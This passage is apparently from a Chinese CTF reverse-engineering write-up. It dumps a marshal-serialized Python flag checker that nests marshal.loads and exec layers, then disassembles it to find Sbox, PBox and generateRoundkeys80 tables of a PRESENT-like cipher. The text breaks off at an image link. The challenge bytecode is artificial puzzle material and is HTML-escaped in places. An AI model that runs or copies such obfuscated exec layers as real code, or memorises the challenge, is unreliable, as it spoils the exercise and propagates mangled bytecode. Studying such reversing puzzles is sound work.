\x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\tr\x11\x00\x00\x00\xda\x05rangeZ\x08Sbox_invrH\x00\x00\x00Z\x08PBox_inv\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x10\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00\xda\x08&lt;module&gt;\x03\x00\x00\x00sl\x00\x00\x00$\x01\x12\x01 \x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\xfd\x04\x04\x12\x02\n\x01&#x27;</span></span><br><span class="line"></span><br><span class="line">l = marshal.loads(code)</span><br><span class="line"><span class="built_in">exec</span>(l)</span><br></pre></td></tr></table></figure><p>直接执行是会报错的 拿到这种还是先用dis.dis查看下字节码(本地跑还一直报错 用在线python跑就行了)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l = marshal.loads(code)</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line">dis.dis(l)</span><br></pre></td></tr></table></figure><p>可以发现里面还嵌了marshal</p><details><summary>点击查看代码</summary><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">  3           0 LOAD_CONST               0 (12)</span><br><span class="line">              2 LOAD_CONST               1 (5)</span><br><span class="line">              4 LOAD_CONST               2 (6)</span><br><span class="line">              6 LOAD_CONST               3 (11)</span><br><span class="line">              8 LOAD_CONST               4 (9)</span><br><span class="line">             10 LOAD_CONST               5 (0)</span><br><span class="line">             12 LOAD_CONST               6 (10)</span><br><span class="line">             14 LOAD_CONST               7 (13)</span><br><span class="line">             16 LOAD_CONST               8 (3)</span><br><span class="line">             18 LOAD_CONST               9 (14)</span><br><span class="line">             20 LOAD_CONST              10 (15)</span><br><span class="line">             22 LOAD_CONST              11 (8)</span><br><span class="line">             24 LOAD_CONST              12 (4)</span><br><span class="line">             26 LOAD_CONST              13 (7)</span><br><span class="line">             28 LOAD_CONST              14 (1)</span><br><span class="line">             30 LOAD_CONST              15 (2)</span><br><span class="line">             32 BUILD_LIST              16</span><br><span class="line">             34 STORE_NAME               0 (Sbox)</span><br><span class="line"></span><br><span class="line">  4          36 LOAD_CONST              16 (&lt;code object &lt;listcomp&gt; at 0x7fbf6f8f83a0, file &quot;&quot;, line 4&gt;)</span><br><span class="line">             38 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">             40 MAKE_FUNCTION            0</span><br><span class="line">             42 LOAD_NAME                1 (range)</span><br><span class="line">             44 LOAD_CONST              18 (16)</span><br><span class="line">             46 CALL_FUNCTION            1</span><br><span class="line">             48 GET_ITER</span><br><span class="line">             50 CALL_FUNCTION            1</span><br><span class="line">             52 STORE_NAME               2 (Sbox_inv)</span><br><span class="line"></span><br><span class="line">  5          54 LOAD_CONST               5 (0)</span><br><span class="line">             56 LOAD_CONST              18 (16)</span><br><span class="line">             58 LOAD_CONST              19 (32)</span><br><span class="line">             60 LOAD_CONST              20 (48)</span><br><span class="line">             62 LOAD_CONST              14 (1)</span><br><span class="line">             64 LOAD_CONST              21 (17)</span><br><span class="line">             66 LOAD_CONST              22 (33)</span><br><span class="line">             68 LOAD_CONST              23 (49)</span><br><span class="line">             70 LOAD_CONST              15 (2)</span><br><span class="line">             72 LOAD_CONST              24 (18)</span><br><span class="line">             74 LOAD_CONST              25 (34)</span><br><span class="line">             76 LOAD_CONST              26 (50)</span><br><span class="line">             78 LOAD_CONST               8 (3)</span><br><span class="line">             80 LOAD_CONST              27 (19)</span><br><span class="line">             82 LOAD_CONST              28 (35)</span><br><span class="line">             84 LOAD_CONST              29 (51)</span><br><span class="line"></span><br><span class="line">  6          86 LOAD_CONST              12 (4)</span><br><span class="line">             88 LOAD_CONST              30 (20)</span><br><span class="line">             90 LOAD_CONST              31 (36)</span><br><span class="line">             92 LOAD_CONST              32 (52)</span><br><span class="line">             94 LOAD_CONST               1 (5)</span><br><span class="line">             96 LOAD_CONST              33 (21)</span><br><span class="line">             98 LOAD_CONST              34 (37)</span><br><span class="line">            100 LOAD_CONST              35 (53)</span><br><span class="line">            102 LOAD_CONST               2 (6)</span><br><span class="line">            104 LOAD_CONST              36 (22)</span><br><span class="line">            106 LOAD_CONST              37 (38)</span><br><span class="line">            108 LOAD_CONST              38 (54)</span><br><span class="line">            110 LOAD_CONST              13 (7)</span><br><span class="line">            112 LOAD_CONST              39 (23)</span><br><span class="line">            114 LOAD_CONST              40 (39)</span><br><span class="line">            116 LOAD_CONST              41 (55)</span><br><span class="line"></span><br><span class="line">  7         118 LOAD_CONST              11 (8)</span><br><span class="line">            120 LOAD_CONST              42 (24)</span><br><span class="line">            122 LOAD_CONST              43 (40)</span><br><span class="line">            124 LOAD_CONST              44 (56)</span><br><span class="line">            126 LOAD_CONST               4 (9)</span><br><span class="line">            128 LOAD_CONST              45 (25)</span><br><span class="line">            130 LOAD_CONST              46 (41)</span><br><span class="line">            132 LOAD_CONST              47 (57)</span><br><span class="line">            134 LOAD_CONST               6 (10)</span><br><span class="line">            136 LOAD_CONST              48 (26)</span><br><span class="line">            138 LOAD_CONST              49 (42)</span><br><span class="line">            140 LOAD_CONST              50 (58)</span><br><span class="line">            142 LOAD_CONST               3 (11)</span><br><span class="line">            144 LOAD_CONST              51 (27)</span><br><span class="line">            146 LOAD_CONST              52 (43)</span><br><span class="line">            148 LOAD_CONST              53 (59)</span><br><span class="line"></span><br><span class="line">  8         150 LOAD_CONST               0 (12)</span><br><span class="line">            152 LOAD_CONST              54 (28)</span><br><span class="line">            154 LOAD_CONST              55 (44)</span><br><span class="line">            156 LOAD_CONST              56 (60)</span><br><span class="line">            158 LOAD_CONST               7 (13)</span><br><span class="line">            160 LOAD_CONST              57 (29)</span><br><span class="line">            162 LOAD_CONST              58 (45)</span><br><span class="line">            164 LOAD_CONST              59 (61)</span><br><span class="line">            166 LOAD_CONST               9 (14)</span><br><span class="line">            168 LOAD_CONST              60 (30)</span><br><span class="line">            170 LOAD_CONST              61 (46)</span><br><span class="line">            172 LOAD_CONST              62 (62)</span><br><span class="line">            174 LOAD_CONST              10 (15)</span><br><span class="line">            176 LOAD_CONST              63 (31)</span><br><span class="line">            178 LOAD_CONST              64 (47)</span><br><span class="line">            180 LOAD_CONST              65 (63)</span><br><span class="line"></span><br><span class="line">  5         182 BUILD_LIST              64</span><br><span class="line">            184 STORE_NAME               3 (PBox)</span><br><span class="line"></span><br><span class="line">  9         186 LOAD_CONST              66 (&lt;code object &lt;listcomp&gt; at 0x7fbf6f8f8660, file &quot;&quot;, line 9&gt;)</span><br><span class="line">            188 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">            190 MAKE_FUNCTION            0</span><br><span class="line">            192 LOAD_NAME                1 (range)</span><br><span class="line">            194 LOAD_CONST              67 (64)</span><br><span class="line">            196 CALL_FUNCTION            1</span><br><span class="line">            198 GET_ITER</span><br><span class="line">            200 CALL_FUNCTION            1</span><br><span class="line">            202 STORE_NAME               4 (PBox_inv)</span><br><span class="line"></span><br><span class="line"> 11         204 LOAD_NAME                5 (marshal)</span><br><span class="line">            206 LOAD_METHOD              6 (loads)</span><br><span class="line">            208 LOAD_CONST              68 (b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01&#x27;)</span><br><span class="line">            210 CALL_METHOD              1</span><br><span class="line">            212 STORE_NAME               7 (co)</span><br><span class="line"></span><br><span class="line"> 12         214 LOAD_NAME                8 (exec)</span><br><span class="line">            216 LOAD_NAME                7 (co)</span><br><span class="line">            218 CALL_FUNCTION            1</span><br><span class="line">            220 POP_TOP</span><br><span class="line">            222 LOAD_CONST              69 (None)</span><br><span class="line">            224 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7fbf6f8f83a0, file &quot;&quot;, line 4&gt;:</span><br><span class="line">  4           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (Sbox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7fbf6f8f8660, file &quot;&quot;, line 9&gt;:</span><br><span class="line">  9           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (PBox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></details><p>注意到有几个显眼特征:</p><ul><li>Sbox</li><li>PBox</li><li>generateRoundkeys80<br>搜索可以得到:</li></ul><p><img src="https://s2.loli.net/2023/12/03/QR6G7gCuYtfhc1P.png" 